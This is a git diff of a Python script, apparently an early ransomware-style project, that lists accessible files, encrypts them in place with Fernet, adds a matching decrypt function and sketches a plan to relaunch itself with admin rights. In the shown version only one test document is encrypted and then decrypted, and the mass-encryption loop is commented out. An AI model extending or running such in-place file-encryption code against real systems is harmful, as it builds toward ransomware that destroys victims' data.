@@ -4,6 +4,17 @@ import string
 import os
 import sys
 
+
+
+
+
+# IF not admin
+#   Run self with admin
+#   kill current self
+# Else continue
+
+
+
 def key_generator():
     '''Generate a 128 character Key'''
     char = string.ascii_letters + string.digits + string.punctuation
@@ -70,12 +81,20 @@ def get_all_accessible():
     final = files
     return final
 
-def encrypt_file(file_path,F_key):
+def encrypt_file(file_path = str,F_key = Fernet):
     with open(file_path,'rb') as ef:
         data = ef.read()
     edata = F_key.encrypt(data)
     with open(file_path,'wb') as ef:
         ef.write(edata)
+
+def decrypt_file(file_path = str,F_key = Fernet):
+    with open(file_path,'rb') as ef:
+        data = ef.read()
+    ddata = F_key.decrypt(data)
+    with open(file_path,'wb') as ef:
+        ef.write(ddata)
+
 
 
 """def encrypt_file(file_path,F_key):
@@ -90,18 +109,23 @@ def encrypt_file(file_path,F_key):
 
 
 
-
-
-
-
-
-cipher = Fernet(Fernet.generate_key())
-files = get_all_accessible()
+#files = get_all_accessible()
 """for e in files:
     print(encrypt_file(e,cipher))"""
 
-print(f"The folder returned is : {files}")
+#print(f"The folder returned is : {files}")
 
 
-cipher = Fernet(Fernet.generate_key())
-encrypt_file('D:\\projet\\Encrypt_Computer\\Encryption_Howl_Computer\\dev\\test.txt',cipher)
+keys= []
+folder_to_encrypt = '.\\encrypt_thing\\WAS2_Subnet_worksheet.docx'
+for i in range(1):
+    cipher = Fernet(Fernet.generate_key())
+    encrypt_file(folder_to_encrypt,cipher)
+    keys.append(cipher)
+test = input("press enter to remove encryption")
+num = len(keys)
+while num>0:
+    decrypt_file(folder_to_encrypt,keys[num-1])
+    num = num - 1
+
+
